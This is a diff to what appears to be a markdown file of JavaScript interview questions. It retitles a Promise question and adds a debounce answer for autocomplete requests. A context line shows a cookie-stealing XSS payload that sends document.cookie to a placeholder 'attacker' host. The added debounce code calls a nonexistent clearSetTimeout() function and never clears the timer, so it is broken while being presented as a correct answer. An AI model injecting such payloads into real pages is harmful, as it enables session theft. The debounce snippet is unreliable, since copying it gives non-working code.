@@ -796,7 +796,7 @@ queue([
 ], obj);
 ```
 
-### 25.2 Write async function in JS (This is my interview question at Yahoo)
+### 25.2 Pure JS Promise -- Write async function in JS (This is my interview question at Yahoo)
 ```javascript
 var remoteData = {'test': 'hi'};
 var getData = function () {
@@ -1231,6 +1231,26 @@ Referenced:
 <script>
 window.location='http://attacker/?cookie='+document.cookie
 </script>
+```
+
+### 38. How to set delay time for autocomplete request? (Apple Interview)
+
+* We could leverage setTimeout() for this
+
+```javascript
+var timer;
+function onKeyUp() {
+    if (timer) {
+        clearSetTimeout();
+    }
+
+    timer = setTimeout(function() {
+        displaySearch();
+    }, 3000);
+}
+function displaySearch() {
+    alert('result');
+}
 ```
 
 
